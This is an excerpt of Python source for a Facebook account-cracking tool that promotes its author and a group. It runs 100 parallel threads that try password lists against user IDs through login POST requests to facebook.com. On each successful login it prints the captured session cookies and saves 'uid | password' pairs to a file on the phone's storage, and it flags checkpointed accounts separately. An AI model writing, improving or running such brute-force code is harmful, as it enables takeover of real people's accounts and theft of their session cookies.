...
def mueor():
    ...
    with ThreadPool(max_workers=100) as MUEOR:
        ...
        print('\033[1;37m[\033[1;32mâœ“\033[1;32m] TOOL CREATED BY Rahad JOIN MY GROUP ')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent':pro,
            'viewport-width': '980',}
            lo = session.post('https://www.facebook.com/profile.php?id=100092181615565',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[RAHAD-OKðŸ’š] {uid} â€¢ {ps}" '  \n\033[1;33m [ðŸ’‰]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [ðŸ¤§] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/RAHAD-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[RAHAD-CPðŸ’”] {uid} â€¢ {ps}")
